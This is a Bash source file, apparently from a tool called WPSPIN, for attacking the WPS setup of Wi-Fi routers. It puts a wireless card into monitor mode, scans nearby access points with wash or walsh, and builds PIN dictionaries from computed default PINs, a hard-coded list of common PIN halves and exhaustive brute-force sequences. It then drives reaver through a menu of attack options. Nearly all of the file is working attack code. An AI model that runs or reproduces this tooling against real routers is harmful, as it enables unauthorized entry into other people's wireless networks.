PRIMARY_CHECK



                                                                             # this function will check if there is any wireless device recognized by he system
iw dev | grep Interface >  /tmp/Interface.txt                                # if there is not, the user will be directed to short menu where no scan or wireless attack
 declare -a INTERFACE                                                        #  ar allowed So we grep the information of iw dev in a text file 
 declare -a WLANX                                                            # declare 3 arrays, one for the total interfaces, one for the wlan and the other for mon
 declare -a MONX
  for i in 'INTERFACE' 'WLANX'  'MONX' ;
  do 
  count=1                
    if [ "$i" == "INTERFACE" ]; then
      while read -r line; do                                                 # read line by line the output  
      INTERFACE[${count}]="$line"
      count=$((count+1))                                                     # counting lines form one to one
      done < <( cat /tmp/Interface.txt | awk -F' ' '{ print $2 }')           # we grap the second field with awk to fill the array for total interface
    elif [ "$i" == "WLANX" ]; then                                           # the the same but with "grep" wlan to select the mode managed interfaces
      while read -r line; do
      WLANX[${count}]="$line"
      count=$((count+1))  
      done < <( cat /tmp/Interface.txt | awk -F' ' '{ print $2 }' | grep wlan )
    elif [ "$i" == "MONX" ]; then                                            # The same with the mon interfaces
      while read -r line; do
      MONX[${count}]="$line"
      count=$((count+1)) 
      done < <( cat /tmp/Interface.txt | awk -F' ' '{ print $2 }' | grep mon )
    fi    
 done
rm /tmp/Interface.txt &> /dev/null                                           # we erase the temporary text
IW_INTERFACE=$(echo ${#INTERFACE[@]})                                        # this is just to make a basic control of chipset and interface 
IW_WLANX=$(echo ${#WLANX[@]})
IW_MONX=$(echo ${#MONX[@]})
  
 if [ "$IW_INTERFACE" == 0 ]; then                                          # if no wireless device is detected, the script will be limited to a "Short menu" where
 
SORTMENUE_WARNING="$NO_MONITOR_MODE"                                         # no scan or attack


SHORTMENUE ############################################################ to be redacted according to the language ######################################################
  
  
 fi


airmon-ng | sed '1,4d' | sed '$d' > /tmp/airmon.txt        # with sed and airmon-ng we take out the interesting information of airmon-ng command
declare -a MON_INTERFACE                                                      # one array for the chipset and one array for the interface   
declare -a MON_CHIPSET
                                                            
for i in 'MON_INTERFACE' 'MON_CHIPSET'  ;                                       # we links the values of te arrays with i
do 
 count=1                                                                      # we start from one             
  if [ "$i" == "MON_INTERFACE" ]; then                                        # we start with the array for the mode monitor capable interfaces
      while read -r line; do                                                  # we read the output of airmon-ng line by line and give a value to each line
      MON_INTERFACE[${count}]="$line"                                         # a value to each line 
      count=$((count+1))                                                      # and count one by one
      done < <( cat /tmp/airmon.txt | awk -F' ' '{ print $1 }')               # we take the first field that is wlanX or monX in airmon-ng display 
  elif [ "$i" == "MON_CHIPSET" ]; then                                        # The same for the chipset of the interface
      while read -r line; do
      MON_CHIPSET[${count}]="$line"
      count=$((count+1)) 
      done < <( cat /tmp/airmon.txt | awk -F' ' '{ print $2 $3 }' ) 
 
                                  
   fi    
done
rm /tmp/airmon.txt &> /dev/null
AIRMON_INTERFACE=$(echo ${#MON_INTERFACE[@]}) 
AIRMON_CHIPSET=$(echo ${#MON_CHIPSET[@]})
BAD_CHIPSET=$( echo "${MON_CHIPSET[1]}" | grep Unknown)



if [ "$AIRMON_INTERFACE" == 0 ]; then                                         #if no mode monitor interface is detected we will remain in short menu )no wash and no reaver)
 
SORTMENUE_WARNING="$NO_MONITOR_MODE"
 
 SHORTMENUE                                                      ###################################### change according to selected language################################

elif [ "$IW_WLANX" == 1 ] && [ -n "${BAD_CHIPSET}" ]   ; then         # if the only chipset is unknown by airmon-ng

  echo "$MON_ADVERTENCIA"                                                     ################ defined according to language ###########################
  sleep 8
  ifconfig $(echo "${MON_INTERFACE[1]}") down &>/dev/null
  MON_ATTACK=$( airmon-ng start $(echo "${MON_INTERFACE[1]}") | grep enabled |  awk -F' ' '{ print $5 }' |  sed -e 's/)//g' ) &>/dev/null  # we activate mode monitor
  ifconfig $(echo "${MON_INTERFACE[1]}") down &>/dev/null
fi

if [ "$AIRMON_INTERFACE" == 1 ] && [ "$IW_INTERFACE" == 1 ]    ; then         # if there is just one interface and no mode monitor interface, this single interface
 ifconfig $(echo "${MON_INTERFACE[1]}") down &>/dev/null
  MONOTORIZED_WLAN=$(echo "${WLANX[1]}")                      ####### MONOTORIZED WLAN will be called to lower interface before wash scan and uper the interface for reaver when dealing with rt3070
  MON_ATTACK=$( airmon-ng start $(echo "${MON_INTERFACE[1]}") | grep enabled |  awk -F' ' '{ print $5 }' |  sed -e 's/)//g' ) &>/dev/null # we activate mode monitor automatically
#  RT_CHECK=$( echo "${MON_CHIPSET[1]}" | grep RalinkRT2870)                  # filter for rt3070 that associate better if wlan is up
#   if [ -n "${RT_CHECK}" ]; then
#     ifconfig $(echo "${WLANX[1]}") up &>/dev/null
#   else
     ifconfig $(echo "${WLANX[1]}") down &>/dev/null
#   fi
elif [ "$AIRMON_INTERFACE" == 2 ] && [ "$IW_INTERFACE" == 2 ] && [ "$IW_MONX" == 1 ] ; then   # if there is one wlan and one mon the mon will be automatically selected 
  MON_ATTACK=$(echo "${MONX[1]}")
  MONOTORIZED_WLAN=$(echo "${WLANX[1]}")                      ####### MONOTORIZED WLAN will be called to lower interface before wash scan and uper the interface for reaver when dealing with rt3070   
#  RT_CHECK=$( echo "${MON_CHIPSET[1]}" | grep RalinkRT2870)                  # filter for rt3070 that associate better if wlan is up
#   if [ -n "${RT_CHECK}" ]; then
#     ifconfig $(echo "${WLANX[1]}") up &>/dev/null
#   else
     ifconfig $(echo "${WLANX[1]}") down &>/dev/null
#   fi
fi


if [ "$MON_ATTACK" == "" ] && [ "$IW_MONX" == 0 ]; then                        # If there is no interface in monitor mode detected      
  while [ "$MON_ATTACK" == "" ]; do                                            # Until an interface hasn't been properly chosen 
  
    echo "$INTERFACEDESIGN"                                                         ########################## modified according to the selected language #################
  
     for i in ${!MON_INTERFACE[*]}; do                                         # the user will be prompt to choose between interfaces with mode monitor compatibility
       CHIPSET_REDLIST=$(echo ${MON_CHIPSET[${i}]} | grep Unknown )
         if [ -n "${CHIPSET_REDLIST}" ]; then
           CHIPSET_DISPLAY=$( echo -e "$rojo${MON_CHIPSET[${i}]})$colorbase")
         else 
           CHIPSET_DISPLAY=$( echo -e "$verdefluo${MON_CHIPSET[${i}]}$colorbase" ) 
         fi
       CHECK_MON_INTERFACE=$(echo "${MON_INTERFACE[${i}]}")

       DRIVERINTERACE=$( ls -l /sys/class/net/$CHECK_MON_INTERFACE/device/driver | rev | cut -d "/" -f1 | rev )
       
        if [ "$CHECK_MON_INTERFACE" = "wlan0" ] || [ "$CHECK_MON_INTERFACE" = "wlan1" ] || [ "$CHECK_MON_INTERFACE" = "wlan2" ] || [ "$CHECK_MON_INTERFACE" = "wlan3" ]|| [ "$CHECK_MON_INTERFACE" = "wlan4" ]|| [ "$CHECK_MON_INTERFACE" = "wlan5" ]|| [ "$CHECK_MON_INTERFACE" = "wlan6" ]|| [ "$CHECK_MON_INTERFACE" = "wlan7" ]|| [ "$CHECK_MON_INTERFACE" = "wlan8" ]|| [ "$CHECK_MON_INTERFACE" = "wlan9" ]; then
          
         
   
         echo -e "     $amarillo$i$blanco        ${MON_INTERFACE[${i}]}       $CHIPSET_DISPLAY$colorbase - driver $azulfluo$DRIVERINTERACE" 
      
       else
     
         echo -e "     $amarillo$i$blanco        ${MON_INTERFACE[${i}]}       $CHIPSET_DISPLAY$colorbase - driver $azulfluo$DRIVERINTERACE"  
       fi  
 
    done
  echo ""
  echo -e "    $colorbase          ---------------------------------------------------"
  echo ""  

  

 
  SELECT_THEIFACE                            ############################ modified according to the language ###########################
  
  ifconfig $(echo ${MON_INTERFACE[${i}]}) down &>/dev/null                           # We bring down the interface
  
  MON_ATTACK=$(airmon-ng start $(echo ${MON_INTERFACE[${i}]}) | grep enabled |  awk -F' ' '{ print $5 }' |  sed -e 's/)//g') &>/dev/null   # We start mode monitor                    
  MONOTORIZED_WLAN=$(echo ${MON_INTERFACE[${i}]})   ############ Test for rt3070 & co

#  RT_CHECK=$(echo ${MON_CHIPSET[${i}]} | grep RalinkRT2870 )                  # filter for rt3070 that associate better if wlan is up
#   if [ -n "${RT_CHECK}" ]; then
#     ifconfig $(echo ${MON_INTERFACE[${i}]}) up &>/dev/null
#   else
     ifconfig $(echo ${MON_INTERFACE[${i}]}) down &>/dev/null
#   fi
  
  done
fi




IFACE_SELECTION(){                                           ################################ IFACE SELECTION ##################################################

while [ "$MON_ATTACK" == "" ]; do                                            # at the end of iface we call this function to select an interface for reaver and wash
  
  echo "$INTERFACEDESIGN"                                                         ########################## modified according to the selected language #################
  
  for i in ${!MON_INTERFACE[*]}; do                                          # we display the available interface 
   



CHIPSET_REDLIST=$(echo ${MON_CHIPSET[${i}]} | grep Unknown )
         if [ -n "${CHIPSET_REDLIST}" ]; then
           CHIPSET_DISPLAY=$( echo -e "$rojo${MON_CHIPSET[${i}]})$colorbase")
         else 
           CHIPSET_DISPLAY=$( echo -e "$verdefluo${MON_CHIPSET[${i}]}$colorbase" ) 
         fi

CHECK_MON_INTERFACE=$(echo ${MON_INTERFACE[${i}]})

DRIVERINTERACE=$( ls -l /sys/class/net/$CHECK_MON_INTERFACE/device/driver | rev | cut -d "/" -f1 | rev )

     if [ "$CHECK_MON_INTERFACE" = "wlan0" ] || [ "$CHECK_MON_INTERFACE" = "wlan1" ] || [ "$CHECK_MON_INTERFACE" = "wlan2" ] || [ "$CHECK_MON_INTERFACE" = "wlan3" ]|| [ "$CHECK_MON_INTERFACE" = "wlan4" ]|| [ "$CHECK_MON_INTERFACE" = "wlan5" ]|| [ "$CHECK_MON_INTERFACE" = "wlan6" ]|| [ "$CHECK_MON_INTERFACE" = "wlan7" ]|| [ "$CHECK_MON_INTERFACE" = "wlan8" ]|| [ "$CHECK_MON_INTERFACE" = "wlan9" ]; then



       echo -e "     $amarillo$i$blanco        ${MON_INTERFACE[${i}]}      $CHIPSET_DISPLAY$colorbase - driver $azulfluo$DRIVERINTERACE "              # displayed with this for loop
       else
       echo -e "     $amarillo$i$blanco        ${MON_INTERFACE[${i}]}       $CHIPSET_DISPLAY$colorbase - driver $azulfluo$DRIVERINTERACE "              # displayed with this for loop  
       fi  


  done
  echo ""
  echo -e "    $colorbase          ---------------------------------------------------"
  echo ""

SELECT_THEIFACE                            ############################ modified according to the language ###########################

CHOIX=$( echo " ${MON_INTERFACE[${i}]} ")                                 #CHOIX is the chosen interface by the user

  if [ "$CHOIX" == "" ]; then 
   IFACE_SELECTION                                                        # recursively calling the function in case the user made a mistake to re-enter data
  fi
MONITORIZED=$( echo "$CHOIX" | grep mon )                                   # in case the interface is in mode monitor we create monotorized

  if [ "$MONITORIZED"  == "" ]; then                                        # if monotorized is empty it means the ethX or wlanX has to be put into monitor mode
    ifconfig $CHOIX down &>/dev/null                                              # we bring the interface down
    MON_ATTACK=$( airmon-ng start $CHOIX | grep enabled |  awk -F' ' '{ print $5 }' |  sed -e 's/)//g' ) &>/dev/null  # we activate mode monitor an in the 
    MONOTORIZED_WLAN="$CHOIX"
#     RT_CHECK=$( echo ${MON_CHIPSET[${i}]} | grep RalinkRT2870 )                  # filter for rt3070 that associate better if wlan is up
#     if [ -n "${RT_CHECK}" ]; then
#       ifconfig $(echo ${MON_INTERFACE[${i}]}) up &>/dev/null
#     else
       ifconfig $(echo ${MON_INTERFACE[${i}]}) down &>/dev/null
#     fi 
                                                # identifier of the interface, then we ensure disconnect
  else
  MON_ATTACK="$CHOIX"  
  PHY=$(  airmon-ng | grep $CHOIX | cut -d "-" -f2 | tr -d ' ' | sed 's:^.\(.*\).$:\1:' ) &> /dev/null 
  MONOTORIZED_WLAN=$( airmon-ng | grep $PHY | awk -F' ' '{ print $1 }' | grep wlan ) &> /dev/null
 

 fi                                                                           # check & disconnect function
done
}

IFACE_SELECTION                                                

CHIPSET_CHECK=$( (echo ${MON_CHIPSET[${i}]}) | grep Unknown )                # last we check if the chipset is unknown and will display a warning if it is true

if [ -n "${CHIPSET_CHECK}" ]; then                                           # if the variables full then it means that chipset is unknown            

echo "$AIRMON_WARNING"
sleep 8

fi
RT_CHECK=$( airmon-ng | grep $MONOTORIZED_WLAN | grep Ralink ) &> /dev/null ############3TESTING#####################

}













WASH_SCAN(){                                                  # This function will launch wash generate default PIN for the scanned AP and display the result with some color
if [ "$WALSH_O_WASH" == "wash" ]; then 

   declare -a BSSID                                                      # We declare array to fill with the scan results, bssid, essid, etc...
   declare -a CHANNEL                                                    # 
   declare -a RSSI                                            
   declare -a WPS
   declare -a LOCKED
   declare -a ESSID 
     for i in 'BSSID' 'CHANNEL' 'RSSI' 'WPS' 'LOCKED' 'ESSID';                               # linking every array with "i"   
       do 
       count=1                                                                                # start from 1
         if [ "$i" == "BSSID" ]; then                                                        # First array for bssid of target AP  
           while read -r line; do                                                            # we read our temp file line by line
             BSSID[${count}]="$line"                                                           # 
             count=$((count+1))                                                                # and count from one to one
           done < <( cat wash_scan.txt | awk -F' ' '{ print $1 }')                      # we keep the first field using space as a delimiter (Bssid in the scan=
        elif [ "$i" == "CHANNEL" ]; then                                                    # and so on...
          while read -r line; do
           CHANNEL[${count}]="$line"
           count=$((count+1))
          done < <( cat wash_scan.txt | awk -F' ' '{ print $2 }')                      # second field which is the channel number
        elif [ "$i" == "RSSI" ]; then                                                        # etc...
          while read -r line; do
            RSSI[${count}]="$line"
            count=$((count+1))
          done < <( cat wash_scan.txt | awk -F' ' '{ print $3 }') 
       elif [ "$i" == "WPS" ]; then
          while read -r line; do
            WPS[${count}]="$line"
            count=$((count+1))
          done < <( cat wash_scan.txt | awk -F' ' '{ print $4 }')
       elif [ "$i" == "LOCKED" ]; then
          while read -r line; do
            LOCKED[${count}]="$line"
            count=$((count+1))
          done < <( cat wash_scan.txt | awk -F' ' '{ print $5 }')
       elif [ "$i" == "ESSID" ]; then
         while read -r line; do
         ESSID[${count}]="$line"
         count=$((count+1))
         done < <( cat wash_scan.txt | awk -F' ' '{ print $6 }')                        
       fi
  clear
  done                        

else


   declare -a BSSID
   declare -a ESSID
      for i in 'BSSID' 'ESSID';
       do 
       count=1                                                                                # start from 1
         if [ "$i" == "BSSID" ]; then                                                        # First array for bssid of target AP  
           while read -r line; do                                                            # we read our temp file line by line
             BSSID[${count}]="$line"                                                           # 
             count=$((count+1))                                                                # and count from one to one
           done < <( cat wash_scan.txt | awk -F' ' '{ print $1 }')    
         elif [ "$i" == "ESSID" ]; then                                                        # second array for essid of target AP  
           while read -r line; do                                                              # we read our temp file line by line
             ESSID[${count}]="$line"                                                           # 
             count=$((count+1))                                                                # and count from one to one
           done < <( cat wash_scan.txt | awk -F' ' '{ print $2 }')
         fi
      clear 
      done
       

fi   

WASH_DISPLAY #################################################################to be defined according to the languages##########################################################

OUTPUT

ATTACK

}





REAVER_CHECK(){      

                                                                           # This function is here to check if reaver is installed, if not the user will be in short menu
which reaver &> /dev/null                                                  # Thanks antares for this trick for fast checking if reaver is present
if [ $? -ne 0 ]; then                                                         
SORTMENUE_WARNING="$NO_REAVER" ########################################### to define according to the language, here to warn about need to install reaver
SHORTMENUE
fi

which walsh &> /dev/null                                                   # if the reaver is bypassed user can have reaver 1.3 with walsh or reaver 1.4 with wash so
if [ $? -ne 0 ]; then                                                      # we determine which one is gonna be used
  WALSH_O_WASH=$( echo "wash")
else
  WALSH_O_WASH=$(echo "walsh") 
fi 
}




ATTACK(){


     WPCGENERATOR                                                         # we check and generate wpc file 




  if [[ "$HEAD1" = "0" ]] && [[ "$HEAD2" = "0" ]] && [[ "$HEAD3" = "0" ]] ; then                         # Now we show the PIN that will be used for attack, 
                                                                    # now we deal with session where no PIN has been tried
                                       
    PRIMERAMITAD=$( cat "$DIRECTORY/$WPCNAME" | awk NR==4)                                                            
    SEGUNDAMITAD=$( cat "$DIRECTORY/$WPCNAME" | awk NR==10004)        # that for our second half PIN, the first one of the list
    
    STRING=$( echo "$PRIMERAMITAD$SEGUNDAMITAD" )                   # that the 7 digits of the PIN to be shown,the next to be sent by reaver

    
    
    CHECKSUM
  
  elif (( "$HEAD1" >> 0 )) && [[ "$HEAD3" = "0" ]] ; then        # and that is when we didn't made the first half but tried some PIN 
    
    NEXTFIRSTHALF=`expr 4 '+' $HEAD1`
    
    PRIMERAMITAD=$( cat "$DIRECTORY/$WPCNAME" | awk NR==$NEXTFIRSTHALF)
    SEGUNDAMITAD=$( cat "$DIRECTORY/$WPCNAME" | awk NR==10004)        # that for our second half PIN, the first one of the list
        
    STRING=$( echo "$PRIMERAMITAD$SEGUNDAMITAD" )
    
    SUMUPNOM6 # TO BE WRITTEN ACCORDING TO THE LANGUAGE#
    
    
    CHECKSUM

  elif  [[ "$HEAD3" = "1" ]]  ; then        # We got the M6 and the first half of WPSPIN 
  
    NEXTFIRSTHALF=`expr $HEAD1 '+' 4`
    PRIMERAMITAD=$( cat "$DIRECTORY/$WPCNAME" | awk NR==$NEXTFIRSTHALF)
    NEXTSECONDHALF=`expr $HEAD2 '+' 10004`
    SEGUNDAMITAD=$( cat "$DIRECTORY/$WPCNAME" | awk NR==$NEXTSECONDHALF)

    STRING=$( echo "$PRIMERAMITAD$SEGUNDAMITAD" )
    
    
    SUMUPM6 # TO BE WRITTEN ACCORDING TO THE LANGUAGE



    
    CHECKSUM

 
   elif [[ "$HEAD3" == "2" ]] ; then 
 
    NEXTFIRSTHALF=`expr $HEAD1 '+' 4`
    PRIMERAMITAD=$( cat "$DIRECTORY/$WPCNAME" | awk NR==$NEXTFIRSTHALF)
    NEXTSECONDHALF=`expr $HEAD2 '+' 10004`
    SEGUNDAMITAD=$( cat "$DIRECTORY/$WPCNAME" | awk NR==$NEXTSECONDHALF)

    STRING=$( echo "$PRIMERAMITAD$SEGUNDAMITAD" )

   
   
   CHECKSUM

   PINFOUND # TO BE WRITTEN ACCORDING TO THE LANGUAGE
 
  fi                                                     # if not the PIN displayed will be the generated by default 
    

     ATTACK_MENUE_DISPLAY  #############################################  definer according to the language            
    
      

     if [ "$ATTACK_MENUE_CHOICE" == 1 ]; then                             # first option of attack menu: attack with reaver and default PIN
     
      ls "$DIRECTORY/$WPCNAME" &> /dev/null
 
         if [ $? -ne 0 ]; then                                               # if there is no session prepared

              WPCGENERATOR                                                       # We call the function generate the wpc session
         fi
     
      ATTACK_ATTACK
            
      ATTACK                                           # and call recessively the function ATTACK

     elif [ "$ATTACK_MENUE_CHOICE" == 2 ]; then                           # second option, attack with a customized PIN  
     
     CUSTOMPIN        ################## TO BE DEFINED ACCORDING TO THE LANGUAGE, to enter manually one PIN

   #  WPCGENERATOR                                                         # We call the function to generate the wpc session
     
   #  ATTACK_ATTACK                                                        # that basically the reaver order and grabbing key system
            
     ATTACK                                           # and call recessively the function ATTACK

     elif [ "$ATTACK_MENUE_CHOICE" == 3 ]; then                           # Third option to enter a sequence of PIN

     SECATOR         ################## TO BE DEFINED ACCORDING TO THE LANGUAGE, to enter a sequence of PIN

   #  WPCGENERATOR                                                         # We call the function to generate the wpc session
     
   #  ATTACK_ATTACK                                                        # that basically the reaver order and grabbing key system
            
     ATTACK                                           # and call recessively the function ATTACK


      elif [ "$ATTACK_MENUE_CHOICE" == 4 ]; then  # ther fourth option allows user to enter other arguments

     CUSTOMREAVER  ########### writen according to the language
    
      ATTACK

     elif [ "$ATTACK_MENUE_CHOICE" == 5 ]; then                                           # equal to "select another target"
     
       if [ "$BIG_MENUE_CHOICE" == 2 ]; then                                               # if we are in generator mode we simply close the loop and go back to the attack menu
          
         echo " "
       
       else
        
         while  [ "$ATTACK_MENUE_CHOICE" == 5 ]; do                                       # in case we want to display again the scan results  
         
                    
           WASH_SCAN                                                                          #with reload
         
           OUTPUT
         
           GENERATE
         
           ATTACK
         
         done
       
       fi                                                                            
     
     elif [ "$ATTACK_MENUE_CHOICE" == 6 ]; then                                          # option "go back to previous menu"

     BIG_MENUE

     elif [ "$ATTACK_MENUE_CHOICE" == 7 ]; then                                          # option restart/change language

     unset
     CLEAN
     bash WPSPIN.sh

     else                                                                               # option exit
     CLEAN
     CIAO
     exit 0
  
     fi
}   




BIG_MENUE(){                                                                            

BIG_MENUE_DISPLAY                                                                     # options of the "big menu", WPSPIN with all options available

if [ "$BIG_MENUE_CHOICE" == 1 ]; then                                                 # 1 is washscan = scan with wash and attack with reaver guided

echo ""
echo "$WASHWAIT" #####################################REDIGER SELON LANGUE######### message to advice the user that the scan is launched and result will be displayed in a while
echo ""    



  ifconfig $MONOTORIZED_WLAN down  #      

  xterm -l -lf scan.txt -e $WALSH_O_WASH -i $MON_ATTACK  -C      # this is the general sentence

 chmod 777 scan.txt &> /dev/null 



if [ "$WALSH_O_WASH" == "wash" ]; then 
 cat scan.txt | sed '1,6d' | grep  "........."    > wash_scan.txt
 chmod 777 wash_scan.txt 
 rm scan.txt &> /dev/null
 else 
 cat scan.txt | sed "1,3d" | grep  "........."    > wash_scan.txt
 chmod 777 wash_scan.txt 
 rm scan.txt &> /dev/null
fi

WASH_SCAN


  

elif [ "$BIG_MENUE_CHOICE" == 2 ]; then                                              # 2 is the pin generator, the user enter manually the data bssid and essid

  #while [[ "$ATTACK_MENUE_CHOICE" -ne 5 ]]; do                                       # we make a while loop to maintain the process enter data - generate pin - attack menu
  
    DATASGENERADOR
    GENERATE
    OUTPUT
    ATTACK
    BIG_MENUE 
  
  #done

elif [ "$BIG_MENUE_CHOICE" == 3 ]; then                                          # to change interface, we erase the value of the selected interface and relaunch the selection 

  unset MON_ATTACK                                                               # of the interface
  IFACE
  BIG_MENUE

elif [ "$BIG_MENUE_CHOICE" == 4 ]; then                                          # restart and change language

  CLEAN
  bash WPSPIN.sh

else                                                                             # to exit script

CLEAN
  CIAO
  exit 0

fi

exit
}


recursive_generator()                                     # This function was created by Spaw from crack-wifi.com and generously given
{                                                         # Thanks you Spawn :)
    if (($1 == 0))                                        
    then 
         echo $2 
    else 
        for car in 0 1 2 3 4 5 6 7 8 9;                                      
        do 
            recursive_generator $(($1 - 1)) $2$car                             
        done                                                                   
    fi                                                                         
}                                                         # end of the function "recursive_generator"





SEQUENCEFIRST()                                                # We create the sequence withe the selected PIN range ( first half )
{
if [ "$INICIOSEQUENCEFIRST" -gt "$FINSEQUENCEFIRST" ]; then     # if end sequence is < to the beginning
  for i in $(seq $FINSEQUENCEFIRST $INICIOSEQUENCEFIRST)  ;    # we change the order of the value for the seq command          
    do
      printf '%04d\n' $i                                      # zero padding                  
  done | tac  2> /dev/null                                     # and we reverse the result
else
  for i in $(seq $INICIOSEQUENCEFIRST $FINSEQUENCEFIRST)  ;             # if the sequence is incremental
    do
      printf '%04d\n' $i                                      # we give straight the seq command result                
  done 2> /dev/null
fi
}





SEQUENCESECOND()
{
if [ "$INICIOSEQUENCESECOND" -gt "$FINSEQUENCESECOND" ]; then       # if end sequence is < to the beginning
  for i in $(seq $FINSEQUENCESECOND $INICIOSEQUENCESECOND)  ;    # we change the order of the value for the seq command          
    do
      printf '%03d\n' $i                                      # zero padding                  
  done | tac  2> /dev/null                                     # and we reverse the result
else
for i in $(seq $INICIOSEQUENCESECOND $FINSEQUENCESECOND)  ;       # We create the sequence withe the selected PIN range ( second half )
    do
      printf '%03d\n' $i                                      # zero padding in case the beginning sequence is < 100                 
  done 2> /dev/null 
fi
}


 
BASICPINGENERATOR()                                            # We generate a PIN dictionary started with default PIN, then known generic PIN
{
echo "$FIRSTHALFSESSION"
SEQUENCEFIRST 2> /dev/null
echo "$STARTSELECTEDPIN
$PART1
$STARTPIN
$STARTPIN2
$STARTPIN3
$STARTPIN4
$STARTPIN5
$STARTPIN6
$STARTPIN7
$STARTPIN8
1234
1186
8847
1883
2017
1653
1670
1835
8820
7376
4329
1975
1340
2032
4394
4739"
recursive_generator 4
echo "$SECONDHALFSESSION"
SEQUENCESECOND 2> /dev/null
echo "$ENDSELECTEDPIN
$PART2
$ENDPIN
$ENDPIN2
$ENDPIN3
$ENDPIN4
$ENDPIN5
$ENDPIN6
$ENDPIN7
$ENDPIN8
567
642
876
648
252
806
273
560
290
705
791
696
970
976
455
271"  
recursive_generator 3
}






WPCGENERATOR(){

STARTSELECTEDPIN=$( echo "$SELECTEDPIN" | cut -b -4 )    # We cut the selected PIN in half
ENDSELECTEDPIN=$( echo "$SELECTEDPIN" | cut -b 5-7 )
STARTPIN=$( echo "$PIN" | cut -b -4 )                 # We cut the default PIN in two half and take away the checksum in the second half
ENDPIN=$( echo "$PIN" | cut -b 5-7 )
STARTPIN2=$( echo "$PIN2" | cut -b -4 )                  # and do until the 8th default PIN ( maximum with AdbBroadband PDG4100N )
ENDPIN2=$( echo "$PIN2" | cut -b 5-7 )
STARTPIN3=$( echo "$PIN3" | cut -b -4 )
ENDPIN3=$( echo "$PIN3" | cut -b 5-7 )
STARTPIN4=$( echo "$PIN4" | cut -b -4 )
ENDPIN4=$( echo "$PIN4" | cut -b 5-7 )
STARTPIN5=$( echo "$PIN5" | cut -b -4 )
ENDPIN5=$( echo "$PIN5" | cut -b 5-7 )
STARTPIN6=$( echo "$PIN6" | cut -b -4 )
ENDPIN6=$( echo "$PIN6" | cut -b 5-7 )
STARTPIN7=$( echo "$PIN7" | cut -b -4 )
ENDPIN7=$( echo "$PIN7" | cut -b 5-7 )
STARTPIN8=$( echo "$PIN8" | cut -b -4 )
ENDPIN8=$( echo "$PIN8" | cut -b 5-7 )


unset HEAD1 2> /dev/null
unset HEAD2 2> /dev/null
unset HEAD3 2> /dev/null


BSSIDSINPUNTOS=$(echo "$BSSID" | tr -d ':')
WPCNAME=$(echo "$BSSIDSINPUNTOS.wpc")                                # the name of the wpc file calling previous variable CHECKBSSID

HEAD1=$( cat "$DIRECTORY/$WPCNAME" 2> /dev/null | awk NR==1)                # the first value of the wpc header                    
HEAD2=$( cat "$DIRECTORY/$WPCNAME" 2> /dev/null | awk NR==2)                # the second value of the wpc header
HEAD3=$( cat "$DIRECTORY/$WPCNAME" 2> /dev/null | awk NR==3)                # the third value of the wpc header 





ls "$DIRECTORY/$WPCNAME"  &> /dev/null                                # by this condition we check if there is already a session named bssid.wpc for the
                                                         # objective. If there is not we will activate the generators to create it
  if [ $? -ne 0 ] || [ "$HEAD1" == "0" ] || [ -z $HEAD3 ]   ; then   # if there is no wpc session, or if no pin has been tried, or if it

HEAD1=0
HEAD2=0
HEAD3=0

HEADER=$( echo "$HEAD3
$HEAD2
$HEAD1" )                                    # header with value 0
                                            # is corrupted, we will use 0 0 0 as a header

   else

HEADER=$( echo "$HEAD3
$HEAD2
$HEAD1" )                                    # otherwise we grab the older headers

  fi



if (( "$HEAD1" >> 0 )) 2> /dev/null &&  [[ "$HEAD3" == "0" ]] 2> /dev/null ; then     # MAYBE???? in case we didn't get the first half but tried already some PIN, for avoiding issue with M6 we will always keep one PIN less - or make a rectify function..
        
     INDICEPIN=`expr 3 '+' $HEAD1`                          # we add three to the the value of $HEAD3
        
     BADHALFPIN=$( cat "$DIRECTORY/$WPCNAME" | awk NR==$INDICEPIN)      # and take the line in our wpc session that the last PIN tried (unsuccessful)
        
     FIRSTHALFSESSION=$( head -$INDICEPIN "$DIRECTORY/$WPCNAME" | tail -n+4 )  # that is our beginning of session ( first half)
 

     
elif (( "$HEAD1" >> 0 )) 2> /dev/null &&  [[ "$HEAD3" == "1" ]] 2> /dev/null ; then  # in case we did get the first half of the PIN

     INDICEPIN=`expr 3 '+' $HEAD1` 

     INDICEPIN3=`expr 1 '+' $INDICEPIN`  #if we get the first half we store the half that come after the indicated PIN, she is the good one 

     GOODHALFPIN=$( cat "$DIRECTORY/$WPCNAME" | awk NR==$INDICEPIN3)     # We store it as GOODHALPIN

     FIRSTHALFSESSION=$( head -$INDICEPIN3 "$DIRECTORY/$WPCNAME" | tail -n+4 )  # that is our beginning of session ( first half)

     INDICEPIN2=`expr 10003 '+' $HEAD2`

       
     INDICEPIN4=`expr 1 '+' $INDICEPIN2`

     INDICEPINVICTORY=`expr 1 '+' $INDICEPIN4`
     
     SECONDHALFSESSION=$( head -$INDICEPIN2 "$DIRECTORY/$WPCNAME" | tail -n+10004 )  # that is our beginning of session ( second half)
     
     BADSECONDHALFPIN=$( cat "$DIRECTORY/$WPCNAME" | awk NR==$INDICEPIN2)

elif (( "$HEAD1" >> 0 )) 2> /dev/null &&  [[ "$HEAD3" == "2" ]] 2> /dev/null ; then  # in case we did get the PIN

    INDICEPIN=`expr 3 '+' $HEAD1` 

     INDICEPIN3=`expr 1 '+' $INDICEPIN`  #if we get the first half we store the half that come after the indicated PIN, she is the good one 

     GOODHALFPIN=$( cat "$DIRECTORY/$WPCNAME" | awk NR==$INDICEPIN3)     # We store it as GOODHALPIN

     FIRSTHALFSESSION=$( head -$INDICEPIN3 "$DIRECTORY/$WPCNAME" | tail -n+4 )  # that is our beginning of session ( first half)

     INDICEPIN2=`expr 10003 '+' $HEAD2`

     
    
     INDICEPIN4=`expr 1 '+' $INDICEPIN2`

     INDICEPINVICTORY=`expr 1 '+' $INDICEPIN4`
     
     SECONDHALFSESSION=$( head -$INDICEPIN2 "$DIRECTORY/$WPCNAME" | tail -n+10004 )  # that is our beginning of session ( second half)
     
     BADSECONDHALFPIN=$( cat "$DIRECTORY/$WPCNAME" | awk NR==$INDICEPIN2)

fi 

rm -r  /tmp/brouillon.wpc  2> /dev/null                                        # delete brouillon.wpc
rm /tmp/brouillon.wpc 2> /dev/null

if [ "$ATTACK_MENUE_CHOICE" == 2 ] || [ "$ATTACK_MENUE_CHOICE" == 3 ]; then    # to cumulate verious sequence
 
  PART1=$( head -10003 "$DIRECTORY/$WPCNAME" | tail -n+4 )
  PART2=$( cat "$DIRECTORY/$WPCNAME" | tail -n+10004 )

fi 
  


BASICPINGENERATOR > /tmp/brouillon.wpc                     # We generate the PIN dictionary

sed 's/^ *//; s/ *$//; /^$/d' /tmp/brouillon.wpc >> /tmp/brouillon2.wpc # removing blanks line, trailing and leading blank 

rm -r  /tmp/brouillon.wpc                                          # delete brouillon.wpc

